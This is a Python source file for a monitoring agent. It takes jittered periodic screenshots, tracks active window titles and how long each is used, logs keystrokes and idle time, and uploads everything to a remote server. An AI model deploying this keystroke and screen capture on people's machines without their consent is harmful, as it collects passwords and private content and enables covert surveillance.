import time
import threading
import os
from config import Config
from storage import Storage
from uploader import Uploader
from collectors import screenshot, window, input

class MonitorAgent:
    def __init__(self):
        Config.setup()
        self.storage = Storage()
        self.uploader = Uploader(self.storage)
        self.uploader.register_agent()
        
        self.screenshot_collector = screenshot.ScreenshotCollector(os.path.join(Config.DATA_DIR, "screenshots"))
        self.window_collector = window.WindowCollector()
        self.input_collector = input.InputCollector()
        
        self.running = False
        
    def start(self):
        self.running = True
        self.input_collector.start()
        
        # Start threads for different intervals
        threading.Thread(target=self._screenshot_loop, daemon=True).start()
        threading.Thread(target=self._window_loop, daemon=True).start()
        threading.Thread(target=self._upload_loop, daemon=True).start()
        threading.Thread(target=self._input_flush_loop, daemon=True).start()
        
        # Main thread can just wait or do heartbeat
        while self.running:
            time.sleep(10)
            
    def stop(self):
        self.running = False
        self.input_collector.stop()
        
    def _screenshot_loop(self):
        import random
        while self.running:
            try:
                path = self.screenshot_collector.capture()
                self.storage.save_screenshot(path, time.time())
            except Exception as e:
                print(f"Screenshot error: {e}")
            
            config_data = self.uploader.get_remote_config()
            interval_mins = config_data.get("screenshot_interval_minutes", 20) if config_data else 20
            
            interval_secs = interval_mins * 60
            jitter = int(interval_secs * 0.1)
            time.sleep(interval_secs + random.randint(-jitter, jitter))
            
    def _window_loop(self):
        last_app_data = None
        last_time = time.time()
        
        while self.running:
            try:
                data = self.window_collector.get_active_window()
                if data:
                    current_app = f"{data.get('process_name')}-{data.get('window_title')}"
                    last_app = f"{last_app_data.get('process_name')}-{last_app_data.get('window_title')}" if last_app_data else None
                    
                    if current_app != last_app:
                        now = time.time()
                        if last_app_data is not None:
                            duration = now - last_time
                            log_data = {
                                "process_name": last_app_data.get('process_name'),
                                "window_title": last_app_data.get('window_title'),
                                "duration": duration
                            }
                            # Log the app that we just switched AWAY from, with its duration
                            self.storage.save_log("app_switch", log_data, now)
                        
                        last_app_data = data
                        last_time = now
            except Exception as e:
                print(f"Window log error: {e}")
            time.sleep(Config.ACTIVE_WINDOW_INTERVAL)
            
    def _upload_loop(self):
        while self.running:
            try:
                self.uploader.upload_logs()
                self.uploader.upload_screenshots()
            except Exception as e:
                print(f"Upload loop error: {e}")
            time.sleep(Config.UPLOAD_INTERVAL)
            
    def _input_flush_loop(self):
        while self.running:
            try:
                keystrokes = self.input_collector.get_and_clear_keystrokes()
                if keystrokes:
                    self.storage.save_log("keystrokes", {"keys": keystrokes}, time.time())
                
                # Check idle
                idle_time = self.input_collector.get_idle_time()
                if idle_time > Config.IDLE_TIMEOUT:
                    self.storage.save_log("idle", {"duration": idle_time}, time.time())

            except Exception as e:
                print(f"Input flush error: {e}")
            time.sleep(60) # Flush every minute
